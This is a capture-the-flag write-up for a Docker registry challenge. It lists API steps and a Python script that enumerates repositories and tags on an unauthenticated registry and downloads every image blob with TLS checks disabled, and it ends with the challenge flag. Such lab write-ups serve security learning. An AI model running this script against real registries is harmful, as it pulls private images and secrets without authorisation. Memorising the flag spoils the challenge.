Solved by: @yappare
### Question:
I found a hole in my ship! Can you help me patch it up and retrieve whatever is left? 
### Solution:
1. This is a docker registry challenge
2. Get catalog /v2/_catalog
3. Get list tags /v2/rms-titanic/tags/list
4. Get digest /v2/rms-titanic/manifest/wreck
5. Download all blobs
6. Extract the tar'ed blobs

The python script to down the blobs:
```python
import os
import json
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable insecure request warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Constants
API_VERSION = "v2"
final_list_of_blobs = []

def list_repos(base_url):
    response = requests.get(f"{base_url}/{API_VERSION}/_catalog", verify=False)
    response.raise_for_status()
    return response.json().get("repositories", [])

def find_tags(base_url, repo_name):
    response = requests.get(f"{base_url}/{API_VERSION}/{repo_name}/tags/list", verify=False)
    response.raise_for_status()
    data = response.json()
    return data.get("tags", [])

def list_blobs(base_url, repo_name, tag):
    response = requests.get(f"{base_url}/{API_VERSION}/{repo_name}/manifests/{tag}", verify=False)
    response.raise_for_status()
    data = response.json()
    if "fsLayers" in data:
        for layer in data["fsLayers"]:
            curr_blob = layer['blobSum'].split(":")[1]
            if curr_blob not in final_list_of_blobs:
                final_list_of_blobs.append(curr_blob)

def download_blobs(base_url, repo_name, blob_digest, dir_name):
    response = requests.get(f"{base_url}/{API_VERSION}/{repo_name}/blobs/sha256:{blob_digest}", verify=False)
    response.raise_for_status()
    filename = f"{blob_digest}.tar.gz"
    with open(os.path.join(dir_name, filename), 'wb') as file:
        file.write(response.content)

def main():
    parser = argparse.ArgumentParser(description="Fetch Docker images from an unauthenticated Docker Registry API.")
    parser.add_argument('-u', '--url', required=True, help="URL Endpoint for Docker Registry API v2. E.g., https://IP:Port")
    args = parser.parse_args()
    base_url = args.url

    try:
        repos = list_repos(base_url)
        if not repos:
            print("No repositories found. Exiting...")
            return

        print("\n[+] List of Repositories:\n")
        for repo in repos:
            print(repo)

        target_repo = input("\nWhich repo would you like to download?: ").strip()
        if target_repo not in repos:
            print("No such repository found. Exiting...")
            return

        tags = find_tags(base_url, target_repo)
        if not tags:
            print("[+] No tags available. Exiting...")
            return

        print("\n[+] Available Tags:\n")
        for tag in tags:
            print(tag)

        target_tag = input("\nWhich tag would you like to download?: ").strip()
        if target_tag not in tags:
            print("No such tag available. Exiting...")
            return

        list_blobs(base_url, target_repo, target_tag)

        dir_name = input("\nProvide a directory name: ").strip()
        os.makedirs(dir_name, exist_ok=True)

        print(f"Downloading all blobs into the '{dir_name}' directory. Unzip all the files and explore as needed.")
        for blob in final_list_of_blobs:
            print(f"\n[+] Downloading Blob: {blob}")
            download_blobs(base_url, target_repo, blob, dir_name)

    except requests.RequestException as e:
        print(f"An error occurred: {e}")
    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Exiting...")

if __name__ == "__main__":
    main()
```

**Flag:** `lactf{thx_4_s4lv4g1ng_my_sh1p!}`

